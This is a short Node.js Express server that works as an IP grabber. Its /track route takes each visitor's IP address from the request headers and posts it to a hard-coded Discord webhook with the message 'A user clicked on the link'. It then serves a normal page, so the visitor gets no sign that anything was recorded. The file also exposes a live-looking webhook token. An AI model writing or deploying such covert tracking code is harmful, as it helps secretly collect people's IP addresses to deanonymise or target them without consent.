const express = require('express');
const axios = require('axios');
const app = express();
const path = require('path');
const os = require('os');

app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/track', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const webhookUrl = 'https://discordapp.com/api/webhooks/1368358386571280435/kLO9BC2RFtV8M0lkCz57upHFFgcmDlllpn8OUM-jnFLOT9OZPi31SafXHikeg5yTGYnn';
  const data = {
    content: `A user clicked on the link. IP address: ${ip}`
  };
  
  axios.post(webhookUrl, data)
    .then(() => {
      res.sendFile(path.join(__dirname, 'index.html'));
    })
    .catch(error => {
      console.error('Error sending to webhook:', error);
      res.status(500).send('Internal Server Error');
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
